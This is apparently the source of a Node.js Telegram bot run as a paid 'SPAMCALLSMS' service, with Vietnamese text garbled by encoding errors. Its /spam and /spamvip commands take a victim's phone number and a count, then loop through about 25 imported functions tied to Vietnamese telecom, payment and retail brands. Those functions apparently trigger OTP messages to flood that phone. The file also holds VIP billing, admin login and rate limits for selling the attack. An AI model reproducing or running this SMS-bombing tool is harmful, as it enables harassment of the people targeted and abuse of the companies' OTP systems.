const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config()
const fs = require('fs');
const path = require('path');
const sharp = require('sharp');
const express = require('express')
const app = express()

const port = process.env.PORT || 3000
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`)
})

const {
    TV360,
    Shine,
    Momo,
    hasaki,
    MyVietel,
    Futabus,
    FTPplay,
    VIEON,
    FPTPLAY2,
    MyTV,
    GalaxyPlay,
    ONPLUS,
    FPTSHOP,
    VIETTEL,
    POPEYES,
    ALFRESCOS,
    VAYVND,
    KIOTVIET,
    MOMO,
    AHAMOVE,
    cashbar,
    shopiness,
    kiot,
    dkvt,
    bestInc
} = require('./otp');

const TARGET_GROUP_ID = -1002407864615;

// const { admin } = require('./admin')

let VIP_USERS = new Map();

// const VIP_DURATION = 30 * 1000;
const VIP_USERS_FILE = path.join(__dirname, 'vip_users.json');
const VIP_DURATION = 30 * 24 * 60 * 60 * 1000; // 30 days in milliseconds

const bot = new TelegramBot(process.env.TELEGRAM_API, { polling: true });

// Delay function
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// Object to track user last spam time and stats
const lastSpamTime = {};
const userStats = new Map(); // Track user statistics

const USER_STATS_FILE_PATH = path.join(__dirname, 'user_stats.json');
const ADMIN_CREDENTIALS = {
    username: process.env.USER_NAME,
    password: process.env.PASS_WORD
};
const adminSessions = new Map();

const formatDate = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0'); // Gi·ªù
    const minutes = now.getMinutes().toString().padStart(2, '0'); // Ph√∫t
    const month = (now.getMonth() + 1).toString().padStart(2, '0'); // Th√°ng (b·∫Øt ƒë·∫ßu t·ª´ 0)
    const day = now.getDate().toString().padStart(2, '0'); // Ng√†y
    const year = now.getFullYear(); // NƒÉm
    return `${hours}:${minutes}, ${month}/${day}/${year}`; // Format mm/dd/yyyy
};

// Function to initialize or update user statistics
const updateUserStats = (userId) => {
    const today = new Date().toISOString().slice(0, 10); // Format YYYY-MM-DD
    if (!userStats.has(userId)) {
        userStats.set(userId, { total: 0, daily: { [today]: 0 } });
    }

    const stats = userStats.get(userId);
    if (!stats.daily[today]) {
        stats.daily[today] = 0;
    }

    return stats;
};

// SMS bombing function
// const smsBomb = async (chatId, phoneNumber, times) => {
//     for (let i = 0; i < times; i++) {
//         await VIETTEL(phoneNumber);
//         await delay(2000); // 2 seconds delay
//         await FPTSHOP(phoneNumber);
//         await delay(2000); // 2 seconds delay
//         await GalaxyPlay(phoneNumber);
//         await delay(2000); // 2 seconds delay
//         await TV360(phoneNumber);
//         await delay(2000); // 2 seconds delay
//         await FTPplay(phoneNumber);
//         await delay(2000); // 2 seconds delay
//         await TV360(phoneNumber); // Again, if necessary
//         await delay(2000); // 2 seconds delay
//         await Shine(phoneNumber);
//         await hasaki(phoneNumber);
//         await MyVietel(phoneNumber);
//         await Futabus(phoneNumber);
//         await VIEON(phoneNumber);
//         await Momo(phoneNumber);
//         await FPTPLAY2(phoneNumber);
//         await MyTV(phoneNumber);
//         await ONPLUS(phoneNumber);
//         await delay(20000); 
//     }
// };

// C·∫≠p nh·∫≠t h√†m smsBomb ƒë·ªÉ ch·∫°y theo y√™u c·∫ßu
const smsBomb = async (chatId, phoneNumber, times) => {
    // Danh s√°ch c√°c d·ªãch v·ª• spam theo th·ª© t·ª± lu√¢n phi√™n
    const services = [
        TV360,
        Shine,
        Momo,
        MyVietel,
        Futabus,
        VIEON,
        FPTPLAY2,
        MyTV,
        GalaxyPlay,
        ONPLUS,
        FPTSHOP,
        VIETTEL,
        FTPplay,
        POPEYES,
        ALFRESCOS,
        VAYVND,
        KIOTVIET,
        MOMO,
        AHAMOVE,
        hasaki,
        cashbar,
        shopiness,
        kiot,
        dkvt,
        bestInc
    ];

    // N·∫øu spam 2 l·∫ßn th√¨ ch·ªâ ch·∫°y VIETTEL v√† FPTSHOP
    if (times === 2) {
        await VIETTEL(phoneNumber);
        await delay(2000); // 2 gi√¢y delay
        await FPTSHOP(phoneNumber);
    } else {
        // N·∫øu spam h∆°n 2 l·∫ßn, lu√¢n phi√™n qua danh s√°ch c√°c d·ªãch v·ª•
        for (let i = 0; i < times; i++) {
            const serviceIndex = i % services.length; // Quay v√≤ng danh s√°ch d·ªãch v·ª•
            const currentService = services[serviceIndex];

            // G·ªçi d·ªãch v·ª• t∆∞∆°ng ·ª©ng
            await currentService(phoneNumber);
            await delay(2000); // 2 gi√¢y delay gi·ªØa m·ªói l·∫ßn g·ªçi

            // Sau m·ªói 10 d·ªãch v·ª• th√¨ delay th√™m 20 gi√¢y
            if ((i + 1) % services.length === 0) {
                await delay(20000); // 20 gi√¢y delay sau khi ch·∫°y h·∫øt t·∫•t c·∫£ c√°c d·ªãch v·ª•
            }
        }
    }
};


// Set bot commands
bot.setMyCommands([
    { command: '/start', description: 'B·∫Øt ƒë·∫ßu v√† hi·ªÉn th·ªã c√°c l·ªánh' },
    { command: '/id', description: 'Xem ID Telegram c·ªßa b·∫°n' },
    { command: '/spam', description: ' /spam <sƒët> <s·ªë_l·∫ßn> - g√≥i th∆∞·ªùng' },
    { command: '/spamvip', description: '/spamvip <sƒët> <s·ªë_l·∫ßn> - g√≥i VIP' },
    { command: '/muavip', description: 'Ch·ªâ 20k/th√°ng cho m√≥n ƒë·ªì ch∆°i n√†y' },
    { command: '/checkvip', description: 'Ki·ªÉm tra t√¨nh tr·∫°ng VIP' },
]);

// L·∫Øng nghe tin nh·∫Øn
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    // Ki·ªÉm tra n·∫øu tin nh·∫Øn t·ªìn t·∫°i
    if (!msg.text) return;

    // Danh s√°ch c√°c l·ªánh h·ª£p l·ªá
    const validCommands = ['/start', '/id', '/spam', '/spamvip', '/muavip', '/checkvip', '/login', '/addvip', '/removevip', '/listvip', '/id@tun_spam_bot', '/muavip@tun_spam_bot', '/checkvip@tun_spam_bot', '/th·∫±ng l·ªìn ƒë·ª©c √≥c con ch√≥'];

    // T√°ch l·ªánh t·ª´ tin nh·∫Øn (ƒë·ªÉ x·ª≠ l√Ω tr∆∞·ªùng h·ª£p c√≥ tham s·ªë)
    const command = msg.text.split(' ')[0].toLowerCase();

    // Ki·ªÉm tra xem c√≥ ph·∫£i l√† l·ªánh h·ª£p l·ªá kh√¥ng
    const isValidCommand = validCommands.includes(command);

    // N·∫øu kh√¥ng ph·∫£i l·ªánh h·ª£p l·ªá v√† kh√¥ng ph·∫£i tin nh·∫Øn t·ª´ bot, th√¨ x√≥a
    if (!isValidCommand && !msg.from.is_bot) {
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (error) {
            console.error('Kh√¥ng th·ªÉ xo√° tin nh·∫Øn:', error);
        }
    }
});



// Handle /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id; // L·∫•y ID c·ªßa ng∆∞·ªùi g·ª≠i
    console.log(chatId)
    if (chatId === TARGET_GROUP_ID) {
        bot.sendMessage(chatId, "Truy c·∫≠p @tun_spam_bot ƒë·ªÉ xem chi ti·∫øt!");
    } else {
        const welcomeMessage = `
Ch√†o m·ª´ng ƒë·∫øn v·ªõi tool SPAMCALLSMS!

Danh s√°ch c√°c l·ªánh c√≥ s·∫µn:
üõ†Ô∏èTOOLüõ†Ô∏è
/start - _Hi·ªÉn th·ªã danh s√°ch n√†y_
/id - _Xem ID Telegram c·ªßa b·∫°n_
/spam <sƒët> <s·ªë_l·∫ßn> - _G√≥i th∆∞·ªùng_
/spamvip <sƒët> <s·ªë_l·∫ßn> - _G√≥i VIP_
/muavip - _Ch·ªâ 20k/th√°ng cho 1 m√≥n ƒë·ªì ch∆°i n√†y._ 
/checkvip <id> - _Ki·ªÉm tra t√¨nh tr·∫°ng VIP_

V√≠ d·ª• s·ª≠ d·ª•ng:
- /spam 0123456789 5 (G√≥i th∆∞·ªùng - spam t·ªëi ƒëa 10 l·∫ßn)
- /spamvip 0123456789 30 (G√≥i VIP - spam t·ªëi ƒëa 30 l·∫ßn)

L∆∞u √Ω: Khi chuy·ªÉn kho·∫£n th√†nh c√¥ng, copy ID TELEGRAM (/id) g·ª≠i cho admin *üî∞@tunzankiesüî∞* ƒë·ªÉ l√™n VIP
        `;
        bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
    }
});

bot.onText(/\/muavip/, async (msg) => {
    const chatId = msg.chat.id;
    const imagePath = './qrcode.jpg'; // ƒê∆∞·ªùng d·∫´n t·ªõi ·∫£nh c·ª•c b·ªô
    const resizedImagePath = './qrcode_resized.jpg'; // ƒê∆∞·ªùng d·∫´n l∆∞u ·∫£nh ƒë√£ thay ƒë·ªïi k√≠ch c·ª°

    if (chatId !== TARGET_GROUP_ID) {
        try {
            // ƒê·ªçc ·∫£nh v√† ƒëi·ªÅu ch·ªânh ch·∫•t l∆∞·ª£ng
            await sharp(imagePath)
                .resize(700, 700, { // Gi·ªØ k√≠ch th∆∞·ªõc l·ªõn h∆°n, v√≠ d·ª• 800x800 pixels
                    fit: 'inside', // Gi·ªØ t·ª∑ l·ªá khung h√¨nh
                    withoutEnlargement: true // Kh√¥ng ph√≥ng to ·∫£nh n·∫øu n√≥ nh·ªè h∆°n k√≠ch th∆∞·ªõc ƒë√≠ch
                })
                .jpeg({ quality: 90 }) // TƒÉng ch·∫•t l∆∞·ª£ng JPEG
                .toFile(resizedImagePath);

            // G·ª≠i ·∫£nh ƒë√£ ƒëi·ªÅu ch·ªânh
            const imageBuffer = fs.readFileSync(resizedImagePath);
            await bot.sendPhoto(chatId, imageBuffer, {
                caption: `Qu√©t m√£ QR tr√™n ƒë·ªÉ thanh to√°n\n-----------------------------\nH·ªå T√äN: *MOMO_DANGANHTUAN*\nS·ªê TI·ªÄN: *20.000VNƒê*\nN·ªòI DUNG: *muavip*`,
                parse_mode: 'Markdown'
            });

            // X√≥a ·∫£nh t·∫°m sau khi g·ª≠i ƒë·ªÉ ti·∫øt ki·ªám dung l∆∞·ª£ng
            fs.unlinkSync(resizedImagePath);

        } catch (error) {
            console.error('L·ªói khi x·ª≠ l√Ω ho·∫∑c g·ª≠i ·∫£nh:', error);
            bot.sendMessage(chatId, 'ƒê√£ x·∫£y ra l·ªói khi x·ª≠ l√Ω ·∫£nh.');
        }
    } else {
        bot.sendMessage(chatId, "Truy c·∫≠p @spam_call_tele_bot ƒë·ªÉ xem chi ti·∫øt!");
    }
});


bot.onText(/\/login (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const username = match[1];
    const password = match[2];

    if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
        adminSessions.set(msg.from.id, true); // Mark this user as an active admin
        bot.sendMessage(chatId, 'ƒêƒÉng nh·∫≠p th√†nh c√¥ng.');
    } else {
        bot.sendMessage(chatId, 'T√™n ƒëƒÉng nh·∫≠p ho·∫∑c m·∫≠t kh·∫©u kh√¥ng ƒë√∫ng.');
    }
});


// Function to mask the last 5 digits of a phone number
// const maskPhoneNumber = (phoneNumber) => {
//     if (phoneNumber.length > 5) {
//         return phoneNumber.slice(0, -5) + '*****';
//     }
//     return '*****'; // If the number is 5 digits or less, mask all
// };

// H√†m ƒë·ªÉ che gi·∫•u s·ªë ƒëi·ªán tho·∫°i
function maskPhoneNumber(phoneNumber) {
    if (phoneNumber && phoneNumber.length > 5) {
        return phoneNumber.slice(0, -5) + '*****';
    }
    return phoneNumber; // Tr·∫£ v·ªÅ nguy√™n b·∫£n n·∫øu s·ªë kh√¥ng h·ª£p l·ªá
}

// L·ªánh spam th∆∞·ªùng
bot.onText(/^\/spam(?!\S)(?:\s+(\S+))?(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    let phoneNumber = match[1]?.trim();
    const times = parseInt(match[2], 10);
    const userId = msg.from.id;
    const currentTime = new Date().getTime();

    // X√≥a tin nh·∫Øn g·ªëc c·ªßa ng∆∞·ªùi d√πng
    bot.deleteMessage(chatId, msg.message_id).catch(error => console.error('Error deleting message:', error));

    if (chatId === TARGET_GROUP_ID) {
        const stats = updateUserStats(userId);
        const today = new Date().toISOString().slice(0, 10);

        if (stats.daily[today] >= 5) {
            bot.sendMessage(chatId, 'B·∫°n ƒë√£ ƒë·∫°t gi·ªõi h·∫°n s·ªë l·∫ßn spam trong ng√†y (5 l·∫ßn). Vui l√≤ng th·ª≠ l·∫°i v√†o ng√†y mai!');
            return;
        }

        if (phoneNumber === '114' || phoneNumber === '113' || phoneNumber === '911' || phoneNumber === '0988282936') {
            bot.sendMessage(chatId, 'S·ªë ƒëi·ªán tho·∫°i ƒë√£ ƒë∆∞·ª£c b·∫£o v·ªá! üòí');
            return;
        }

        if (isNaN(phoneNumber) || times <= 0 || times > 10) {
            bot.sendMessage(chatId, 'Vui l√≤ng nh·∫≠p s·ªë l·∫ßn spam h·ª£p l·ªá (1-10) !');
            return;
        }

        if (lastSpamTime[userId] && currentTime - lastSpamTime[userId] < 10000) {
            const timeLeft = Math.ceil((10000 - (currentTime - lastSpamTime[userId])) / 1000);
            bot.sendMessage(chatId, `Vui l√≤ng ƒë·ª£i ${timeLeft}s tr∆∞·ªõc khi th·ª±c hi·ªán l·ªánh spam l·∫ßn n·ªØa.`);
            return;
        }

        lastSpamTime[userId] = currentTime;
        stats.daily[today] += 1;

        const maskedPhoneNumber = maskPhoneNumber(phoneNumber);
        bot.sendMessage(chatId, `B·∫Øt ƒë·∫ßu t·∫•n c√¥ng: ‚è© ${maskedPhoneNumber}`);
        await delay(4000);
        const currentFormattedTime = formatDate();
        bot.sendMessage(chatId, `‚úÖ TH√ÄNH C√îNG! \n[‚úî] UserID: [üÜî ${msg.from.id}] \n[‚úî] S·ªë Spam: [${maskedPhoneNumber}] \n[‚úî] S·ªë l·∫ßn: ${times} \n[‚úî] Ng√†y: ${currentFormattedTime} \n[‚úî] G√≥i d·ªãch v·ª•: [‚ôõ Th∆∞·ªùng] \n[‚úî] B·∫£n quy·ªÅn: üî∞ @tunzankies üî∞`);
        smsBomb(chatId, phoneNumber, times);

        saveUserStats();
    } else {
        bot.sendMessage(chatId, 'S·ª≠ d·ª•ng l·ªánh trong nh√≥m n√†y: https://t.me/spamsms_tool');
    }
});

// L·ªánh spam VIP
bot.onText(/^\/spamvip(?!\S)(?:\s+(\S+))?(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // X√≥a tin nh·∫Øn g·ªëc c·ªßa ng∆∞·ªùi d√πng
    bot.deleteMessage(chatId, msg.message_id).catch(error => console.error('Error deleting message:', error));

    if (chatId === TARGET_GROUP_ID) {
        let phoneNumber = match[1] ? match[1].trim() : null;
        const times = match[2] ? parseInt(match[2], 10) : null;
        const currentTime = Date.now();

        if (!isVipUser(userId)) {
            bot.sendMessage(chatId, 'B·∫°n kh√¥ng ph·∫£i l√† VIP. Ch·ªâ VIP m·ªõi c√≥ th·ªÉ s·ª≠ d·ª•ng l·ªánh n√†y.');
            return;
        }

        if (!phoneNumber || !times) {
            bot.sendMessage(chatId, 'Vui l√≤ng nh·∫≠p ƒë√∫ng ƒë·ªãnh d·∫°ng: /spamvip [s·ªë ƒëi·ªán tho·∫°i] [s·ªë l·∫ßn]');
            return;
        }

        if (phoneNumber.startsWith('+84')) {
            phoneNumber = '0' + phoneNumber.slice(3);
        }

        if (!/^\d{9,11}$/.test(phoneNumber)) {
            bot.sendMessage(chatId, 'S·ªë ƒëi·ªán tho·∫°i kh√¥ng h·ª£p l·ªá. Vui l√≤ng nh·∫≠p s·ªë t·ª´ 9 ƒë·∫øn 11 ch·ªØ s·ªë.');
            return;
        }

        if (phoneNumber === '114' || phoneNumber === '113' || phoneNumber === '911' || phoneNumber === '0988282936' || phoneNumber === '0383858905') {
            bot.sendMessage(chatId, 'S·ªë ƒëi·ªán tho·∫°i ƒë√£ ƒë∆∞·ª£c b·∫£o v·ªá! üòí');
            return;
        }

        if (isNaN(times) || times <= 0 || times > 30) {
            bot.sendMessage(chatId, 'Vui l√≤ng nh·∫≠p s·ªë l·∫ßn spam h·ª£p l·ªá (1-30). V√≠ d·ª•: /spamvip 1234567890 30');
            return;
        }

        if (lastSpamTime[userId] && currentTime - lastSpamTime[userId] < 10000) {
            const timeLeft = Math.ceil((10000 - (currentTime - lastSpamTime[userId])) / 1000);
            bot.sendMessage(chatId, `Vui l√≤ng ƒë·ª£i ${timeLeft}s tr∆∞·ªõc khi th·ª±c hi·ªán l·ªánh spam l·∫ßn n·ªØa.`);
            return;
        }

        lastSpamTime[userId] = currentTime;

        const maskedPhoneNumber = maskPhoneNumber(phoneNumber);
        bot.sendMessage(chatId, `B·∫Øt ƒë·∫ßu t·∫•n c√¥ng: ‚è© ${maskedPhoneNumber}`);
        await delay(5000);

        const currentFormattedTime = formatDate();
        const successMessage = `‚úÖ TH√ÄNH C√îNG! \n[‚úî] UserID: [üÜî ${userId}] \n[‚úî] S·ªë Spam: [${maskedPhoneNumber}] \n[‚úî] S·ªë l·∫ßn: ${times} \n[‚úî] Ng√†y: ${currentFormattedTime} \n[‚úî] G√≥i d·ªãch v·ª•: [‚ôõ VIP] \n[‚úî] B·∫£n quy·ªÅn: üî∞ @tunzankies üî∞`;

        bot.sendMessage(chatId, successMessage);
        smsBomb(chatId, phoneNumber, times);
    } else {
        bot.sendMessage(chatId, 'S·ª≠ d·ª•ng l·ªánh trong nh√≥m n√†y: https://t.me/spamsms_tool');
    }
});

// Handle /id command
bot.onText(/\/id/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const isVip = VIP_USERS.has(userId) ? '‚úÖ VIP' : '‚òëÔ∏è Th∆∞·ªùng';
    bot.sendMessage(chatId, `üÜî ${userId}\nT√¨nh tr·∫°ng: ${isVip}`,);
});



bot.onText(/\/addvip (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const adminId = msg.from.id;
    const targetUserId = parseInt(match[1], 10);

    if (adminSessions.has(adminId)) {
        try {
            // L·∫•y th√¥ng tin ng∆∞·ªùi d√πng t·ª´ ID
            const chatMember = await bot.getChatMember(chatId, targetUserId);
            const username = chatMember.user.username || chatMember.user.first_name + chatMember.user.last_name || 'Unknown';

            // Th√™m ng∆∞·ªùi d√πng v√†o danh s√°ch VIP
            addVipUser(targetUserId, username);

            bot.sendMessage(chatId, `UserID ${targetUserId} (${username}) ƒë√£ ƒë∆∞·ª£c th√™m v√†o danh s√°ch VIP v√† s·∫Ω h·∫øt h·∫°n sau 30 ng√†y.`);
        } catch (error) {
            console.error('Error adding VIP user:', error);
            bot.sendMessage(chatId, `C√≥ l·ªói x·∫£y ra khi th√™m UserID ${targetUserId} v√†o danh s√°ch VIP. Vui l√≤ng th·ª≠ l·∫°i sau.`);
        }
    } else {
        bot.sendMessage(chatId, 'Ch·ªâ admin m·ªõi c√≥ th·ªÉ th·ª±c hi·ªán l·ªánh n√†y.');
    }
});

bot.onText(/\/removevip (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetUserId = parseInt(match[1], 10);

    if (adminSessions.has(userId)) {
        removeVipUser(targetUserId);
        bot.sendMessage(chatId, `UserID ${targetUserId} ƒë√£ ƒë∆∞·ª£c xo√° kh·ªèi danh s√°ch VIP.`);
    } else {
        bot.sendMessage(chatId, 'Ch·ªâ admin m·ªõi c√≥ th·ªÉ th·ª±c hi·ªán l·ªánh n√†y.');
    }
});


//ƒêi·ªÅu n√†y cho ph√©p ch√∫ng ta b·∫Øt ƒë∆∞·ª£c t·∫•t c·∫£ c√°c input, k·ªÉ c·∫£ khi ng∆∞·ªùi d√πng kh√¥ng nh·∫≠p g√¨ ho·∫∑c nh·∫≠p sai ƒë·ªãnh d·∫°ng.
bot.onText(/\/checkvip(.*)/, (msg, match) => {
    const chatId = msg.chat.id;
    const input = match[1].trim();
    let targetUserId;

    // Ki·ªÉm tra n·∫øu kh√¥ng c√≥ input, s·ª≠ d·ª•ng ID c·ªßa ng∆∞·ªùi g·ª≠i
    if (!input) {
        targetUserId = msg.from.id;
    } else if (isNaN(input)) {
        bot.sendMessage(chatId, 'Vui l√≤ng nh·∫≠p UserID h·ª£p l·ªá ƒë·ªÉ ki·ªÉm tra. V√≠ d·ª•: /checkvip 123456789');
        return;
    } else {
        targetUserId = parseInt(input, 10);
    }

    if (VIP_USERS.has(targetUserId)) {
        const userData = VIP_USERS.get(targetUserId);
        const expirationTimestamp = userData.expirationTimestamp;
        const username = userData.username || 'Kh√¥ng c√≥ t√™n ng∆∞·ªùi d√πng';
        const remainingTime = Math.max(0, expirationTimestamp - Date.now());
        let timeMessage;

        if (remainingTime <= 0) {
            timeMessage = 'ƒë√£ h·∫øt h·∫°n';
        } else if (remainingTime >= 86400000) { // More than or equal to 1 day
            const remainingDays = Math.floor(remainingTime / 86400000);
            timeMessage = `c√≤n ${remainingDays} ng√†y tr∆∞·ªõc khi h·∫øt h·∫°n`;
        } else if (remainingTime >= 3600000) { // More than or equal to 1 hour
            const remainingHours = Math.floor(remainingTime / 3600000);
            timeMessage = `c√≤n ${remainingHours} gi·ªù tr∆∞·ªõc khi h·∫øt h·∫°n`;
        } else {
            const remainingMinutes = Math.ceil(remainingTime / 60000);
            timeMessage = `c√≤n ${remainingMinutes} ph√∫t tr∆∞·ªõc khi h·∫øt h·∫°n`;
        }

        bot.sendMessage(chatId, `UserID ${targetUserId} (${username}) l√† VIP v√† ${timeMessage}.`);
    } else {
        bot.sendMessage(chatId, `UserID ${targetUserId} kh√¥ng ph·∫£i l√† VIP.`);
    }
});

bot.onText(/\/listvip/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id; // ID of the admin executing the command

    if (adminSessions.has(userId)) {
        const vipList = listVipUsers(userId);
        bot.sendMessage(chatId, vipList);
    } else {
        bot.sendMessage(chatId, 'Ch·ªâ admin m·ªõi c√≥ th·ªÉ th·ª±c hi·ªán l·ªánh n√†y.');
    }
});

const loadVipUsers = () => {
    try {
        const data = fs.readFileSync(VIP_USERS_FILE, 'utf8');
        const vipData = JSON.parse(data);
        VIP_USERS = new Map(vipData.map(entry => [
            entry.userId,
            {
                expirationTimestamp: entry.expirationTimestamp.expirationTimestamp,
                username: entry.expirationTimestamp.username
            }
        ]));
    } catch (error) {
        console.error('Error loading VIP users:', error);
        VIP_USERS = new Map();
    }
};
// Save and load VIP users
const saveVipUsers = () => {
    const vipData = Array.from(VIP_USERS.entries()).map(([userId, expirationTimestamp]) => ({
        userId,
        expirationTimestamp
    }));
    fs.writeFileSync(VIP_USERS_FILE, JSON.stringify(vipData, null, 2), 'utf8');
};

const addVipUser = (userId, username) => {
    const expirationTimestamp = Date.now() + VIP_DURATION;
    VIP_USERS.set(userId, { expirationTimestamp, username });
    saveVipUsers();
};

const removeVipUser = (userId) => {
    if (VIP_USERS.has(userId)) {
        VIP_USERS.delete(userId);
        saveVipUsers();
    } else {
        console.log(`UserID ${userId} kh√¥ng c√≥ trong danh s√°ch VIP.`);
    }
};

const listVipUsers = () => {
    if (VIP_USERS.size === 0) {
        return 'Danh s√°ch VIP tr·ªëng.';
    }

    let message = 'Danh s√°ch VIP:\n\n';
    VIP_USERS.forEach((userData, userId) => {
        const expirationDate = new Date(userData.expirationTimestamp).toLocaleString();
        message += `- ID: ${userId}\n  T√™n: ${userData.username || 'Kh√¥ng c√≥ username'}\n  H·∫øt h·∫°n: ${expirationDate}\n\n`;
    });

    return message;
};


const saveUserStats = () => {
    const data = {};
    userStats.forEach((stats, id) => {
        data[id] = stats;
    });
    fs.writeFileSync(USER_STATS_FILE_PATH, JSON.stringify(data, null, 2), 'utf8');
};

const removeExpiredVipUsers = () => {
    const now = Date.now();
    let removed = false;
    for (const [userId, expirationTimestamp] of VIP_USERS.entries()) {
        if (expirationTimestamp <= now) {
            VIP_USERS.delete(userId);
            removed = true;
            console.log(`UserID [${userId}] ƒë√£ h·∫øt h·∫°n VIP v√† ƒë√£ b·ªã x√≥a.`);
        }
    }
    if (removed) {
        saveVipUsers();
    }
};

const isVipUser = (userId) => {
    if (VIP_USERS.has(userId)) {
        const userData = VIP_USERS.get(userId);
        return userData.expirationTimestamp > Date.now();
    }
    return false;
};

// Load VIP users on bot start
loadVipUsers();

// Thi·∫øt l·∫≠p ki·ªÉm tra ƒë·ªãnh k·ª≥ ƒë·ªÉ lo·∫°i b·ªè ng∆∞·ªùi d√πng VIP ƒë√£ h·∫øt h·∫°n (10 ph√∫t m·ªôt l·∫ßn)
setInterval(removeExpiredVipUsers, 10 * 60 * 1000);


// Save user stats on shutdown
process.on('SIGINT', saveUserStats);
process.on('SIGTERM', saveUserStats);

console.log('Bot is running...');
